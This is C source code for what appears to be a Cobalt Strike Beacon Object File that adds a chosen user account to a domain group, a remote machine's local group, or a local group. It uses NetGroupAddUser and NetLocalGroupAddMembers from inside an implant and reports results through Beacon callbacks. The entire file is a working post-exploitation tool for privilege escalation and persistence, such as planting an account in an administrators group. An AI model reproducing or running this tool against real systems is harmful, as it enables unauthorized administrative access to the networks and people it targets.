#include <windows.h>
#include <lm.h>
#include "../../adduserbysamr-bof/src/beacon.h"

DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT uFlags, SIZE_T uBytes);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL hMem);
DECLSPEC_IMPORT int __cdecl MSVCRT$strcmp(const char *s1, const char *s2);
DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf_s(wchar_t *buffer, size_t sizeOfBuffer, const wchar_t *format, ...);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR servername, LPCWSTR groupname, DWORD level, LPBYTE buf, DWORD totalentries);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetGroupAddUser(LPCWSTR servername, LPCWSTR GroupName, LPCWSTR username);

static LPWSTR AnsiToWide(const char *text) {
    int length = 0;
    LPWSTR wide = NULL;

    if (!text || !text[0]) {
        return NULL;
    }

    length = KERNEL32$MultiByteToWideChar(CP_ACP, 0, text, -1, NULL, 0);
    if (length <= 0) {
        return NULL;
    }

    wide = (LPWSTR)KERNEL32$LocalAlloc(LPTR, length * sizeof(WCHAR));
    if (!wide) {
        return NULL;
    }

    KERNEL32$MultiByteToWideChar(CP_ACP, 0, text, -1, wide, length);
    return wide;
}

static void AddUserToGroup(LPCWSTR server, LPCWSTR user, LPCWSTR group, DWORD mode) {
    NET_API_STATUS status = ERROR_SUCCESS;
    LOCALGROUP_MEMBERS_INFO_3 member[1] = {0};

    if (mode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Adding '%ls' to domain group '%ls' on '%ls'\n", user, group, server ? server : L"(default)");
        status = NETAPI32$NetGroupAddUser(server, group, user);
        if (status != NERR_Success) {
            BeaconPrintf(CALLBACK_ERROR, "[-] NetGroupAddUser failed: %lu\n", status);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Success!\n");
        }
        return;
    }

    member[0].lgrmi3_domainandname = (LPWSTR)KERNEL32$LocalAlloc(LPTR, 1024 * sizeof(WCHAR));
    if (!member[0].lgrmi3_domainandname) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate member buffer\n");
        return;
    }

    MSVCRT$swprintf_s(member[0].lgrmi3_domainandname, 1024, L"%s", user);

    if (mode == 1) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Adding '%ls' to remote local group '%ls' on '%ls'\n", user, group, server);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Adding '%ls' to local group '%ls'\n", user, group);
    }

    status = NETAPI32$NetLocalGroupAddMembers(server, group, 3, (LPBYTE)member, 1);
    if (status != NERR_Success) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NetLocalGroupAddMembers failed: %lu\n", status);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Success!\n");
    }

    KERNEL32$LocalFree(member[0].lgrmi3_domainandname);
}

void go(char *args, int len) {
    datap parser;
    char *mode = NULL;
    char *username = NULL;
    char *groupname = NULL;
    char *servername = NULL;
    LPWSTR wideUser = NULL;
    LPWSTR wideGroup = NULL;
    LPWSTR wideServer = NULL;
    DWORD localMode = 0;

    BeaconDataParse(&parser, args, len);
    mode = BeaconDataExtract(&parser, NULL);
    username = BeaconDataExtract(&parser, NULL);
    groupname = BeaconDataExtract(&parser, NULL);
    servername = BeaconDataExtract(&parser, NULL);

    if (!mode || !mode[0] || !username || !username[0] || !groupname || !groupname[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: <domain|remote|local> <user> <group> [host]\n");
        return;
    }

    if (MSVCRT$strcmp(mode, "domain") == 0) {
        localMode = 0;
    } else if (MSVCRT$strcmp(mode, "remote") == 0) {
        localMode = 1;
    } else if (MSVCRT$strcmp(mode, "local") == 0) {
        localMode = 2;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid mode '%s'. Use domain, remote, or local\n", mode);
        return;
    }

    wideUser = AnsiToWide(username);
    wideGroup = AnsiToWide(groupname);
    if (servername && servername[0]) {
        wideServer = AnsiToWide(servername);
    }

    if (!wideUser || !wideGroup) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert arguments to wide strings\n");
        goto cleanup;
    }

    AddUserToGroup(wideServer, wideUser, wideGroup, localMode);

cleanup:
    if (wideUser) KERNEL32$LocalFree(wideUser);
    if (wideGroup) KERNEL32$LocalFree(wideGroup);
    if (wideServer) KERNEL32$LocalFree(wideServer);
}
